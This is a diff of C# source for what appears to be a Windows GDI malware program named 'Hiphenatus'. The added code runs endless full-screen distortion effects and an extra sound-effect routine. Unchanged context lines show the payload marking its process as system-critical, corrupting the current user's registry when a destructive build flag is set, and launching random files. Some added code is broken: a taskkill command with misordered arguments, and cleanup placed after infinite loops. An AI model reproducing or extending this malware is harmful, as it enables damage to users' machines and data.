@@ -294,6 +294,60 @@ namespace Hiphenatus
             DeleteDC(hdc);
             DeleteDC(mdc);
         }
+
+        public static void Shader5()
+        {
+            int x = GetSystemMetrics(SM_CXSCREEN);
+            int y = GetSystemMetrics(SM_CYSCREEN);
+            int size = x * y;
+
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            IntPtr mdc = CreateCompatibleDC(hdc);
+
+            BITMAPINFO bmi = new BITMAPINFO
+            {
+                bmiHeader = new BITMAPINFOHEADER
+                {
+                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
+                    biWidth = x,
+                    biHeight = -y,
+                    biPlanes = 1,
+                    biBitCount = 24,
+                    biCompression = 0
+                },
+                bmiColors = new RGBQUAD[256]
+            };
+
+            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
+            IntPtr oldObject = SelectObject(mdc, bitmap);
+
+            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes
+
+            double ok = 0;
+            while (true)
+            {
+                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
+                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);
+
+                Parallel.For(8, size, i =>
+                {
+                    rgbArray[i * 3 + 2] = (byte)(Math.Sin(i) * Math.Tan(i/ Math.Sin(ok)));
+                    rgbArray[i * 3 + 1] = (byte)(Math.Cos(i) * Math.Tan(i/ Math.Sin(ok)));
+                    rgbArray[i * 3 + 0] = (byte)(Math.Sin(i) * Math.Tan(i/ Math.Sin(ok)));
+
+                });
+                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
+                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);
+                ok += 0.000000001;
+                Thread.Sleep(1);
+            }
+
+            SelectObject(mdc, oldObject);
+            ReleaseDC(IntPtr.Zero, hdc);
+            DeleteObject(bitmap);
+            DeleteDC(hdc);
+            DeleteDC(mdc);
+        }
         public void ci(int x, int y, int w, int h)
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
@@ -329,6 +383,40 @@ namespace Hiphenatus
                 Thread.Sleep(1);
             }
         }
+        public void Sines()
+        {
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            IntPtr hcdc = CreateCompatibleDC(hdc);
+            IntPtr hBitmap = CreateCompatibleBitmap(hdc, w, h);
+            SelectObject(hcdc, hBitmap);
+            BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
+
+            for (int t = 0; ; t += 20)
+            {
+                hdc = GetDC(IntPtr.Zero);
+                for (int y = 0; y <= h; y++)
+                {
+                    float x = (float)((float)Math.Tan(y) + Math.Tan(t));
+                    BitBlt(hcdc, (int)x, y, w, 1, hcdc, 0, (int)(y + x), SRCCOPY);
+                }
+
+                BLENDFUNCTION blend = new BLENDFUNCTION
+                {
+                    BlendOp = AC_SRC_OVER,
+                    BlendFlags = 0,
+                    SourceConstantAlpha = 111,
+                    AlphaFormat = 0
+                };
+
+                AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
+                ReleaseDC(IntPtr.Zero, hdc);
+            }
+
+            ReleaseDC(IntPtr.Zero, hcdc);
+            DeleteObject(hcdc);
+            DeleteObject(hBitmap);
+        }
         public static void DefineAsCritical()
         {
             int isCritical = 1;
@@ -347,7 +435,7 @@ namespace Hiphenatus
                 {
                     Process.Start(files[random.Next(files.Length)]);
                 }
-                catch (Exception){}
+                catch (Exception) { }
             }
         }
 
@@ -362,7 +450,8 @@ namespace Hiphenatus
         public void execPayload()
         {
             DefineAsCritical();
-            if (IS_THIS_BUILD_DESTRUCTIVE == "YES") { 
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            {
                 Corrupt(Registry.CurrentUser);
             }
 
@@ -415,6 +504,7 @@ namespace Hiphenatus
             bytebeat2.Abort();
 
             Thread shader4Thread = new Thread(Shader4); shader4Thread.Start();
+            Thread shader5Thread = new Thread(Sines); shader5Thread.Start();
             Thread bytebeat3 = new Thread(Beat8); bytebeat3.Start();
 
 #if DEBUG
@@ -433,6 +523,16 @@ namespace Hiphenatus
             shader4Thread.Abort();
             bytebeat3.Abort();
             exexe.Abort();
+            shader5Thread.Abort();
+
+            Thread shader6Thread = new Thread(Shader5); shader6Thread.Start();
+            Thread bytebeat4 = new Thread(Beat10); bytebeat4.Start();
+
+            Thread.Sleep(8000);
+
+            shader6Thread.Abort();
+            bytebeat4.Abort();
+
         }
 
 
@@ -446,6 +546,7 @@ namespace Hiphenatus
 
         private void button2_Click(object sender, EventArgs e)
         {
+            SFXLMAO();
             Environment.Exit(0);
         }
 
@@ -454,6 +555,22 @@ namespace Hiphenatus
 #if DEBUG
             Console.WriteLine("DEATHtrackBar: " + trackBar1.Value.ToString());
 #endif
+        }
+
+        public void SFXLMAO()
+        {
+            // Convert the byte array to a temporary file path
+            string tempFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic), "sigma.mp3");
+            File.WriteAllBytes(tempFilePath, Properties.Resources.sigma_boy);
+
+            Process.Start("wmplayer.exe", $"\"{tempFilePath}\"");
+
+            Task.Run(() =>
+            {
+                Thread.Sleep(5000);
+                File.Delete(tempFilePath);
+                Process.Start("taskkill wmplayer.exe /f /im");
+            });
         }
     }
 }
